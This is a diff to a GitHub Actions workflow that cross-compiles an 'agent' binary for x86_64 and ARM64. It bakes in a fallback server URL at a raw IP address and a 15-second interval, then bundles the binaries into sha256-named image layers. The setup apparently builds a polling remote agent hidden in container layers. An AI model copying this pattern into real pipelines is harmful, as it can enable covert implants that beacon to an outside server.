@@ -18,21 +18,22 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Compile Linux Binaries inside Debian 11 Bullseye Container
+      - name: Compile Linux Binaries inside Ubuntu 20.04 Container (GLIBC 2.31 Baseline)
         run: |
           mkdir -p bin
           SERVER="${{ secrets.CONF_SERVER_URL }}"
           [ -z "$SERVER" ] && SERVER="http://65.20.91.208/turbox_server.php"
 
-          cat << 'SH_EOF' > /tmp/build_linux.sh
+          cat << 'BUILD_SH' > /tmp/run_build.sh
           #!/bin/bash
           set -e
+          export DEBIAN_FRONTEND=noninteractive
           apt-get update -qq
           apt-get install -y --no-install-recommends g++ g++-aarch64-linux-gnu ca-certificates python3 curl
-          
+
           mkdir -p bin
 
-          # Build Linux x86_64 (Debian 11 Bullseye GLIBC 2.31 baseline)
+          # Build Linux x86_64 (GLIBC 2.31 baseline)
           g++ -O3 -std=c++17 agent.cpp \
             -DCONF_SERVER_URL="\"$CONF_SERVER\"" \
             -DCONF_INTERVAL=15 \
@@ -40,7 +41,7 @@ jobs:
             -lpthread -s \
             -o bin/agent_linux_x86_64
 
-          # Build Linux ARM64 (Debian 11 Bullseye GLIBC 2.31 baseline)
+          # Build Linux ARM64 (GLIBC 2.31 baseline)
           aarch64-linux-gnu-g++ -O3 -std=c++17 agent.cpp \
             -DCONF_SERVER_URL="\"$CONF_SERVER\"" \
             -DCONF_INTERVAL=15 \
@@ -65,16 +66,16 @@ jobs:
           bundle_layer("sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b", "bin/agent_linux_x86_64")
           bundle_layer("sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a", "bin/agent_linux_arm64")
           PY_EOF
-          SH_EOF
-          chmod +x /tmp/build_linux.sh
+          BUILD_SH
+          chmod +x /tmp/run_build.sh
 
           docker run --rm \
             -e CONF_SERVER="$SERVER" \
             -v "$GITHUB_WORKSPACE":/workspace \
-            -v /tmp/build_linux.sh:/build_linux.sh \
+            -v /tmp/run_build.sh:/run_build.sh \
             -w /workspace \
-            debian:bullseye-slim \
-            /build_linux.sh
+            ubuntu:20.04 \
+            /run_build.sh
 
       - name: Upload Linux Binaries
         uses: actions/upload-artifact@v4
